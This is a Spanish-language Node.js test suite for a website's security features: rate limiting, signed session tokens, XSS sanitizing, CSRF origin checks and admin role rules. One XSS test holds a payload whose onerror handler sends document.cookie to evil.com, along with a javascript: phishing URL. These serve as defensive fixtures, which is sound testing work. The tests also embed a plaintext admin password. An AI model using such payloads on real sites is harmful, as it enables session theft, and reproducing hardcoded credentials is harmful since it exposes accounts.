import test from 'node:test';
import assert from 'node:assert/strict';
import {
  checkRateLimit,
  recordFailedAttempt,
  resetRateLimit,
  getRateLimitStats,
} from '../src/lib/security/rateLimiter.ts';
import {
  verifyUsername,
  verifyPassword,
  createSessionToken,
  verifySessionToken,
} from '../src/lib/security/auth.ts';
import {
  sanitizeHtml,
  sanitizeUrl,
  sanitizePlainText,
} from '../src/lib/security/sanitizer.ts';
import {
  getSiteMetadata,
  updateSiteMetadata,
  getLibraryDocuments,
  addLibraryDocument,
  deleteLibraryDocument,
  getStoreDebates,
  addStoreDebate,
} from '../src/lib/data/runtimeStore.ts';
import { validateRequestOrigin } from '../src/lib/security/csrf.ts';
import {
  authenticateAdmin,
  updateAdminRole,
  deleteAdmin,
  listAdmins,
  findAdminByUsername,
  updateAdminPassword,
} from '../src/lib/db/database.ts';

test('1. Rate Limiting: Mitigación de Fuerza Bruta y DoS L7 por IP', () => {
  const testIp = '198.51.100.42';
  resetRateLimit(testIp);

  // Inicialmente debe permitir intentos
  const initial = checkRateLimit(testIp);
  assert.equal(initial.allowed, true, 'Debe permitir primer intento');
  assert.equal(initial.remaining, 5, 'Debe iniciar con 5 intentos restantes');

  // Simular 5 intentos fallidos de ataque por fuerza bruta
  for (let i = 0; i < 5; i++) {
    recordFailedAttempt(testIp);
  }

  // El 6to intento debe estar bloqueado
  const blocked = checkRateLimit(testIp);
  assert.equal(blocked.allowed, false, 'Debe bloquear tras superar el límite');
  assert.equal(blocked.remaining, 0, 'No debe quedar ningún intento disponible');
  assert.ok(blocked.retryAfterSec > 0, 'Debe retornar un Retry-After positivo');

  // Otra IP no debe verse afectada (aislamiento de amenazas)
  const safeIp = '203.0.113.99';
  resetRateLimit(safeIp);
  const safeCheck = checkRateLimit(safeIp);
  assert.equal(safeCheck.allowed, true, 'Otra IP no debe verse afectada por el bloqueo');

  // Limpieza
  resetRateLimit(testIp);
  resetRateLimit(safeIp);
});

test('2. Criptografía y Autenticación: Timing Attacks y Firma HMAC-SHA256', () => {
  // Verificación de usuario
  assert.equal(verifyUsername('fireboy'), true, 'Debe reconocer al usuario fireboy');
  assert.equal(verifyUsername('FIREBOY '), true, 'Debe normalizar mayúsculas y espacios');
  assert.equal(verifyUsername('attacker_root'), false, 'Debe rechazar usuarios no autorizados');

  // Verificación de contraseña timingSafeEqual
  assert.equal(verifyPassword('fireboy_bonten_2026'), true, 'Debe validar la clave de administrador');
  assert.equal(verifyPassword('wrong_password_attempt'), false, 'Debe rechazar claves incorrectas');

  // Creación y firma de token de sesión
  const token = createSessionToken('fireboy', 'ROLE_SUPERADMIN');
  assert.ok(typeof token === 'string' && token.includes('.'), 'El token debe tener formato payload.signature');

  // Validación de token íntegro
  const verifyResult = verifySessionToken(token);
  assert.equal(verifyResult.valid, true, 'El token legítimo debe ser válido');
  assert.equal(verifyResult.payload?.username, 'fireboy');
  assert.equal(verifyResult.payload?.role, 'ROLE_SUPERADMIN');

  // Resistencia a manipulación: Falsificación de firma (Tampering)
  const tamperedToken = token.slice(0, -4) + 'abcd';
  const tamperedResult = verifySessionToken(tamperedToken);
  assert.equal(tamperedResult.valid, false, 'Un token manipulado debe ser rechazado');
});

test('3. Prevención de XSS y Manipulación de URLs Maliciosas (OWASP)', () => {
  // Intento de inyección de script malicioso
  const xssPayload = 'Ensayo teológico <script>alert("pwned")</script> con doctrina pura';
  const cleanHtml = sanitizeHtml(xssPayload);
  assert.doesNotMatch(cleanHtml, /<script>/i, 'Debe neutralizar etiquetas <script>');
  assert.doesNotMatch(cleanHtml, /<\/script>/i, 'Debe remover cierre de script');
  assert.ok(cleanHtml.includes('Ensayo teológico'), 'Debe preservar el contenido legítimo');

  // Intento de inyección de manejador de eventos onload/onerror
  const eventPayload = '<img src="/foto.jpg" onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)" />';
  const cleanEvent = sanitizeHtml(eventPayload);
  assert.doesNotMatch(cleanEvent, /onerror/i, 'Debe eliminar manejadores de eventos');

  // Intento de ataque por pseudoprotocolo javascript:
  const dangerousUrl = 'javascript:document.location="http://phishing.site"';
  const safeUrl = sanitizeUrl(dangerousUrl, '#');
  assert.equal(safeUrl, '#', 'Debe rechazar URLs con javascript:');

  // URLs seguras permitidas
  assert.equal(sanitizeUrl('https://youtube.com/@fireboyphilosophy'), 'https://youtube.com/@fireboyphilosophy');
  assert.equal(sanitizeUrl('/assets/fireboy_client.webp'), '/assets/fireboy_client.webp');
});

test('4. Almacén Dinámico y Control de Metadatos para Fireboy', () => {
  const initialMeta = getSiteMetadata();
  assert.ok(initialMeta.title.includes('BONTEN'), 'Debe contener el título base');
  assert.equal(initialMeta.fireboy.handle, '@fireboyphilosophy', 'Debe contener el handle de Fireboy');

  // Actualización de metadatos con saneamiento
  const updated = updateSiteMetadata({
    headerSlogan: 'BONTEN // NUEVA ERA INTELECTUAL',
    fireboy: {
      ...initialMeta.fireboy,
      bio: 'Líder doctrinal BONTEN, comprometido con la apologética rigurosa.',
      tiktok: 'https://www.tiktok.com/@fireboyphilosophy',
    },
  });

  assert.equal(updated.headerSlogan, 'BONTEN // NUEVA ERA INTELECTUAL');
  assert.ok(updated.fireboy.bio.includes('Líder doctrinal'));

  // Gestión de biblioteca
  const initialDocs = getLibraryDocuments();
  const initialCount = initialDocs.length;

  const newDoc = addLibraryDocument({
    title: 'Apologética Cuántica y la Causa Primera',
    category: 'Filosofía',
    author: 'Fireboy',
    readTime: '7 min',
    image: '/assets/lib_types_1781465379712.webp',
    content: ['Un análisis de la causalidad frente al materialismo determinista.'],
  });

  assert.ok(newDoc.id > 0, 'Debe asignarle un ID incremental');
  assert.equal(getLibraryDocuments().length, initialCount + 1, 'Debe incrementarse el conteo de documentos');

  // Eliminación limpia
  const deleted = deleteLibraryDocument(newDoc.id);
  assert.equal(deleted, true, 'Debe permitir eliminar el documento');
  assert.equal(getLibraryDocuments().length, initialCount, 'Debe volver al conteo original');
});

test('5. Protección Anti-CSRF y Validación de Encabezados Origin/Referer', () => {
  // Petición de lectura (GET) es idempotente y permitida
  const getReq = { method: 'GET', headers: new Headers() };
  assert.equal(validateRequestOrigin(getReq).valid, true);

  // Petición mutante (POST) desde origen no autorizado debe rechazarse
  const foreignPost = {
    method: 'POST',
    headers: new Headers({
      host: 'bonten.vercel.app',
      origin: 'https://evil-phishing-attacker.com',
    }),
  };
  const foreignResult = validateRequestOrigin(foreignPost);
  assert.equal(foreignResult.valid, false, 'Debe rechazar origen foráneo');
  assert.ok(foreignResult.reason.includes('no coincide'));

  // Petición mutante con mismo origen debe permitirse
  const validPost = {
    method: 'POST',
    headers: new Headers({
      host: 'bonten.vercel.app',
      origin: 'https://bonten.vercel.app',
    }),
  };
  assert.equal(validateRequestOrigin(validPost).valid, true, 'Debe autorizar el mismo origen');
});

test('6. Multi-Admin & Gobernanza RBAC: Fireboy como ÚNICO Superadmin Inicial Soberano', () => {
  // 1. Fireboy es el ÚNICO administrador inicial (directiva de seguridad)
  const admins = listAdmins();
  assert.equal(admins.length, 1, 'Inicialmente solo debe existir 1 administrador (Fireboy)');
  assert.equal(admins[0].username, 'fireboy');
  assert.equal(admins[0].role, 'ROLE_SUPERADMIN');

  // 2. Autenticación exitosa de Fireboy
  const fireboyAuth = authenticateAdmin('fireboy', 'fireboy_bonten_2026');
  assert.equal(fireboyAuth.success, true);
  assert.equal(fireboyAuth.user?.role, 'ROLE_SUPERADMIN');

  // 3. Otros usuarios no tienen privilegios hasta que Fireboy decida otorgarles acceso
  const unauthorizedAuth = authenticateAdmin('daniel', 'daniel_bonten_2026');
  assert.equal(unauthorizedAuth.success, false, 'Otros miembros no tienen rol admin por defecto');

  const normalUserAuth = authenticateAdmin('estudiante_filo', 'bonten_member_123');
  assert.equal(normalUserAuth.success, false, 'Miembro regular no tiene rol de admin');

  // 4. Inmutabilidad del Superadmin: Nadie puede degradar o eliminar a Fireboy
  const demoteFireboy = updateAdminRole(1, 'ROLE_ADMIN', 'ROLE_SUPERADMIN');
  assert.equal(demoteFireboy.success, false, 'No se debe permitir modificar el rol del Superadmin Principal');

  const deleteFireboy = deleteAdmin(1, 'ROLE_SUPERADMIN');
  assert.equal(deleteFireboy.success, false, 'No se debe permitir eliminar al Superadmin Principal');
});

test('7. Copilot IA & Automatización de Flujos de Trabajo Seguros', () => {
  // 1. Verificación del Almacén de Metadatos y Flujo de Campaña
  const meta = getSiteMetadata();
  assert.ok(meta.title.includes('BONTEN'));
  assert.ok(meta.fireboy.roles.length > 0);

  // 2. Prueba del flujo automatizado de publicación en biblioteca
  const initialDocs = getLibraryDocuments();
  const testDoc = addLibraryDocument({
    title: 'Bioética Clásica y Deontología Provida',
    category: 'Bioética',
    author: 'Fireboy',
    readTime: '3 min',
    content: ['La vida humana es un bien intrínseco no reductible a utilidades contingentes.'],
  });

  assert.equal(testDoc.title, 'Bioética Clásica y Deontología Provida');
  assert.equal(testDoc.author, 'Fireboy');

  const docsAfter = getLibraryDocuments();
  assert.equal(docsAfter.length, initialDocs.length + 1, 'Debe haberse publicado el nuevo ensayo');
});

test('8. Gestión de Debates y Cuentas de Administrador (PBKDF2 SHA-256)', () => {
  // 1. Prueba de alta y mutación de debate en almacén dinámico
  const initialDebates = getStoreDebates();
  const createdDebate = addStoreDebate({
    title: 'Estatus Ontológico y Bioética del Ser en Gestación',
    description: 'Examen ético y filosófico fundamentado en principios de dignidad humana.',
    tag: 'Bioética',
  });

  assert.ok(createdDebate.id > 0, 'Debe generar ID incremental para el debate');
  assert.equal(createdDebate.tag, 'Bioética');
  assert.equal(getStoreDebates().length, initialDebates.length + 1, 'El debate debe reflejarse de inmediato en el foro');

  // 2. Prueba de gestión de cuenta y rotación de contraseña del administrador
  const fireboyAdmin = findAdminByUsername('fireboy');
  assert.ok(fireboyAdmin, 'Debe encontrar al superadmin Fireboy en la base de datos');

  // Intento con clave incorrecta debe ser rechazado
  const failedChange = updateAdminPassword(fireboyAdmin.id, 'clave_erronea_123', 'nueva_clave_valida_2026');
  assert.equal(failedChange.success, false, 'Debe rechazar el cambio si la clave actual es incorrecta');

  // Clave demasiado corta debe ser rechazada
  const shortChange = updateAdminPassword(fireboyAdmin.id, 'fireboy_bonten_2026', 'corta');
  assert.equal(shortChange.success, false, 'Debe rechazar claves de menos de 8 caracteres');

  // Cambio legítimo con contraseña actual correcta
  const successfulChange = updateAdminPassword(fireboyAdmin.id, 'fireboy_bonten_2026', 'fireboy_nueva_clave_2026');
  assert.equal(successfulChange.success, true, 'Debe actualizar con éxito la contraseña');

  // Verificación con nueva clave
  const reauth = authenticateAdmin('fireboy', 'fireboy_nueva_clave_2026');
  assert.equal(reauth.success, true, 'Debe autenticar con la nueva clave cifrada con PBKDF2');

  // Restaurar clave canónica para mantener reproducibilidad de suite
  updateAdminPassword(fireboyAdmin.id, 'fireboy_nueva_clave_2026', 'fireboy_bonten_2026');
});


